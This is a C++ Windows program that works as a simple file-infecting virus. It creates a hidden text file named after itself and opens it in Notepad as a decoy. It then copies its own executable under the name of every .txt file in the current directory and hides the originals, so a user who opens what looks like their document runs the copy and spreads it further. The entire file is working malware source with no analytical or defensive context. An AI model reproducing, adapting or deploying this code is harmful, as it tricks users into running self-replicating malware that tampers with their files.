#define NTDDI_VERSION 0x06010000
#define WINVER 0x0601
#define _WIN32_WINNT 0x0601
#define UNICODE
#define _UNICODE

#include <stdio.h>
#include <stdlib.h>
//#include <wchar.h>


#include <windows.h>
#include <initguid.h>
#include <knownfolders.h>
#include <Shlobj.h>
#include <shlwapi.h>
#include <tchar.h>




#define BUFSIZE MAX_PATH
extern "C"
int _tmain(int argc, TCHAR *argv[]) {
	_tprintf(argv[0]);
	TCHAR notepad[BUFSIZE+40];
	//PWSTR *sys32;
	GetWindowsDirectory(notepad, BUFSIZE+40);

	//SHGetKnownFolderPath(FOLDERID_System, 0, NULL, sys32);
	_tprintf(L"%s\n", notepad);
	_tcscat(notepad, L"\\System32\\notepad.exe");
	_tprintf(L"%s\n", notepad);

    TCHAR proc_name[BUFSIZE];
    GetModuleFileName(NULL, proc_name, BUFSIZE);
    _tprintf(L"%s\n", proc_name);

    TCHAR txt_file[BUFSIZE] = L"";
    //memset(txt_file, 0, BUFSIZE);

    _tcsncpy(txt_file, proc_name, _tcslen(proc_name) - 4);

    //int len = _tcslen(proc_name);
    //printf("%d\n", len);

    _tcscat(txt_file, L".txt\0");
    _tprintf(L"%s\n", txt_file);

    TCHAR to_write[] = L"Hello there";

    if (PathFileExists(txt_file)) {
        SetFileAttributes(txt_file, FILE_ATTRIBUTE_HIDDEN);

        printf("Exists!\n");
    } else {
        HANDLE file = CreateFile(txt_file,
                   GENERIC_WRITE,
                   FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                   NULL,
                   CREATE_ALWAYS,
                   FILE_ATTRIBUTE_HIDDEN,
                   NULL
        );
        DWORD bts_written = 0;
        if (file) {
            WriteFile(file, to_write, _tcslen(to_write)*sizeof(TCHAR), &bts_written, NULL);
        }

        printf("Not exists!\n");
    }



	STARTUPINFO si;
    PROCESS_INFORMATION pi;


    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    TCHAR full_cmd[2*BUFSIZE] = L"";
    _tcscat(full_cmd, notepad);
    _tcscat(full_cmd, L" ");
    _tcscat(full_cmd, txt_file);
    _tprintf(L"%s\n", full_cmd);


	//system("notepad.exe");
	//WinExec("notepad.exe", SW_HIDE);


	int err = CreateProcess(notepad,
		full_cmd,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
    );

	printf("%d\n", err);
	TCHAR dir[BUFSIZE+10];
    GetCurrentDirectory(BUFSIZE+10, dir);

	//_tprintf(Buffer);

	_tcscat(dir, L"\\*");
	WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFile(dir, &data);      // DIRECTORY

    if ( hFind != INVALID_HANDLE_VALUE ) {

        do {
            _tprintf(L"%s\n", data.cFileName);
            int fname_len = _tcslen(data.cFileName);
            if (fname_len <= 4)
                continue;
            if (_tcscmp(data.cFileName + fname_len - 4, L".txt") != 0)
                continue;


            TCHAR new_exe[BUFSIZE] = L"";
            _tcsncpy(new_exe, data.cFileName, fname_len - 4);
            _tcscat(new_exe, L".exe");


            if (PathFileExists(new_exe))
                continue;

            CopyFile(proc_name, new_exe, FALSE);
            SetFileAttributes(data.cFileName, FILE_ATTRIBUTE_HIDDEN);

            //_tprintf(L"%s\n", data.cFileName);
        } while (FindNextFile(hFind, &data));
        FindClose(hFind);
    }

	WaitForSingleObject( pi.hProcess, INFINITE );
	CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
}
